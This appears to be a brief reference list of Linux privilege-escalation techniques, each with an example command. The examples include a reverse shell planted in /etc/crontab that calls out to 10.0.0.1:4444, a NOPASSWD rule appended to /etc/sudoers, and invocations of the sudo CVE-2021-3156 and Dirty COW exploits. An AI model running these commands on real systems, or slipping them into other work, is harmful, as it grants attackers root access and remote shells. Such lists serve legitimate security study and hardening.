1. SUID/SGID bit:

An attacker may search for files that have the SUID/SGID bits set, which can allow them to execute those files with elevated privileges.
Example: `find / -perm -4000 2>/dev/null`

2. Exploiting vulnerable services:

An attacker may search for vulnerable services that are running with elevated privileges, and exploit those vulnerabilities to gain root access.
Example: Exploiting the sudo vulnerability (CVE-2021-3156) to escalate privileges: `sudoedit -s '\' $(perl -e 'print "A" x 65536')`

3. Kernel exploits:

An attacker may look for kernel exploits that can allow them to escalate their privileges.
Example: Using the Dirty COW exploit (CVE-2016-5195) to gain root access: `gcc -pthread dirty.c -o dirty -lcrypt && ./dirty`

4. Password cracking:

An attacker may try to crack password hashes to gain access to a privileged account.
Example: Using John the Ripper to crack a password hash: `john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

5. Misconfigured file/folder permissions:

An attacker may look for files or folders with misconfigured permissions that allow them to modify or execute files as a privileged user. Example: Checking for world-writable files and folders: `find / -perm -o=w -type d,f 2>/dev/null`

6. Cron jobs:

An attacker may look for cron jobs running as privileged users and modify them to execute a malicious payload. Example: Adding a malicious command to a cron job running as root: `echo "*/2 * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> /etc/crontab`

7. Sudo misconfigurations:

An attacker may look for sudo configurations that allow them to execute commands as a privileged user. Example: Adding a malicious command to the sudoers file to gain root access: `echo "user ALL=(ALL) NOPASSWD: /usr/bin/vim" >> /etc/sudoers`
